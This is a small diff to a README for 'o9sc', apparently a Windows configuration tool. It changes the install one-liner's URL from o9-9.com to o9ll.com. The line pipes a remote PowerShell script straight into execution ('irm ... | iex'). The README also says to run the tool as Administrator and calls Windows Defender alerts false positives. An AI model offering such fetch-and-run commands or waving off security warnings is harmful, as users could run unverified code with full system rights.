@@ -13,13 +13,13 @@
 
 ## Usage
 
-**o9sc must be run as Administrator to function properly.**  
+**o9sc must be run as Administrator to function properly.**
 _The desktop app may be flagged as a threat by Windows Defender due to its ability to modify system settings. This is a false positive—o9sc is safe, transparent, and open-source._
 
 🖥️ **Launch Command**:
 
 ```
-irm "https://o9-9.com/irm" | iex
+irm "https://o9ll.com/irm" | iex
 ```
 
 🖥️ **Via Winget**:
